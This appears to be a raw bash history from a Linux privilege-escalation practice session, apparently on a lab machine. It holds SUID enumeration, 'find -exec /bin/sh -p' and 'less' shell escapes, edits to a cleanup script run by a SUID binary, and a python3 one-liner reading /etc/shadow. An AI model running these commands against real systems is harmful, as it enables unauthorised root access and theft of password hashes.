clear
pwd
cd //
pwd
cd /
ls
cd /home
ls
cd kirk/
sudo -l
cat /etc/passwd
gruops
gruop
id 
whoami
cat /etc/groups
cat /etc/group
exit
id
whoami
id
cat /etc/shadow
exit
id
whoami
ls
pwd
ls -la
exit
whoami
id
clear
exit
pwd
cd ..
ls -l /usr/bin/less
less /etc/passwd 
clear
less /etc/
clear
find . -exec /bin/sh -p \; -quit 
clear
find . -exec /bin/sh -p \; 
echo $PATH
su ZeroxFive
id 
whoami
clear
less /etc/passwd 
id
whoami
pwd
clear
less /etc/passwd 
id 
whoami
less /etc/passwd 
clear
less /etc/passwd 
id
clear
less /etc/passwd 
id
ls -l /usr/bin/less
less /etc/hosts
id
whoami
sudo -l
less /etc/passwd
less /etc/passwd ! /bin/sh
id
echo $shells
echo $SHELL
less /etc/passwd
less /etc/passwd
id
less /etc/passwd
id
cat /etc/group
clear
less /etc/hosts 
id
clear
less /etc/hosts 
id
whoami
less /etc/passwd
clear
ls
pwd
ls -l /usr/bin 
find / -type -f -perm -04000 ls 2>/dev/null
find / -type -f -perm -04000  2>/dev/null
find / -type -f -perm -4000 ls 2>/dev/null
find / -type -f -perm -0400  2>/dev/null
find / -type -f -perm -04000  2>/dev/null ls
find / -type f -perm -04000  2>/dev/null ls
find / -type f -perm -04000  2>/dev/null 
find / -type f -perm -04000  2>/dev/null -ls
clear
find / -type f -perm -04000  2>/dev/null -ls
su ZeroxFive 
clear
su zeroxvive
su zeroxfive
su ZeroxFive
id
whoami
grouips 
groups 
exit
ls /etc/passwd
cat /etc/passwd
clear
exit
id
clear
exit
cd /home
cd /kirk
ls
cd kirk/
clear
env
printenv
clear
id
whoami
cat /etc/shadow
exit
id
whoami
exit
id
exit
cat RunCleanup 
cat run_cleanup.c 
exit
id
groups
clear
id
groups
clear
ls -l /etc/passwd /etc/groups
ls -l /etc/passwd /etc/group
clear
id 
groups
ls -l /etc/passwd /etc/groups
ls -l /etc/passwd /etc/group
clear
id
groups
ls -l /etc/passwd /etc/group
ls -l /etc/shadow
ls -l /etc/crontab
cat /etc/crontab
clear
id 
groups
ls -l /etc/passwd /etc/group
ls -l /etc/shadow
clear
id 
groups
ls -l /etc/passwd /etc/group
ls -l /etc/shadow /etc/suoders
ls -l /etc/shadow /etc/sudoers
clear
id 
groups
ls -l /etc/passwd /etc/group
ls -l /etc/shadow /etc/sudoers
ls -l /etc/cronjobs
clear
id 
groups
ls -l /etc/passwd /etc/group
ls -l /etc/shadow /etc/sudoers
ls -l /etc/crontab
cat /etc/crontab
uname -a
cat /etc/os-realse

groups
ls -l /etc/passwd /etc/group
ls -l /etc/shadow /etc/sudoers
cat /etc/crontab
groups
ls -l /etc/passwd /etc/group
ls -l /etc/shadow /etc/sudoers
ls -l /etc/crontab
cat /etc/crontab
uname -a
groups
ls -l /etc/passwd /etc/group
ls -l /etc/shadow /etc/sudoers
ls -l /etc/crontab
cat /etc/crontab
uname -a
cat /etc/os-release
cat /opt
clear
cd /opt
ls
env
clear
rpm -qa
dpkg -l
clear
ls -l /usr/bin/find
find / -type f -perm -04000 -ls 2>/dev/null
find . -exec /bin/sh -p \; -quit
clear
cd /
pwd
cd /home/kirk
clear
pwd
clear
ls
clear
find / -type f -perm -u=s -ls 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null
find / -type f -perm -g=s -ls 2>/dev/null
clear
cd /home
ls -l
cd ZeroxFive/
ls ZeroxFive/
clear
cd /
ls -l
clear
ls -l
cd home/kirk
find / -type f -perm -u=s -ls 2>/dev/null
clear
cd /
l
clear
ls -l
cd /home/kirk
find / -type f -prem -u=s -ls 2>/dev/null
find / -type f -prem -u=s -l 2>/dev/null
clear
cd /
clear
ls -l
cd /home/kirk/
find / -type f -perm -u=s -ls 2>/dev/null
clear
find . -exec /bin/sh -p \; -quit 
clear
cd opt
cd /opt
cd maintenance/
nano cleanup.sh
./RunCleanup 
clear
nano cleanup.sh 
clear
find / -type f -perm -u=s -ls 2>/dev/null
clear
find / -type f -perm -u=s -ls 2>/dev/null
find / -type f -perm -u=s -o=w -ls 2>/dev/null
find / -type f -perm -u=s; -perm -o=w -ls 2>/dev/null
id
find / -type f -perm -u=s; -perm -o=w -l 2>/dev/null
find / -type f -perm -u=s; -perm -o=w -ls 2>/dev/null
ls -la /etc/passwd
whoami
clear
find / -type f -perm -u=s -ls 2>/dev/null
ls 
ls -l
nano cleanup.sh 
./RunCleanup 
clear
find / -type f -perm -u=s -ls 2>/dev/null
ls
ls -l
./RunCleanup 
id
ls
cd ..
cd kirk/
getcap -r / 2>/dev/null
python3 -c 'print(open("/etc/shadow")read())'
python3 -c 'print(open("/etc/shadow").read())'
clear
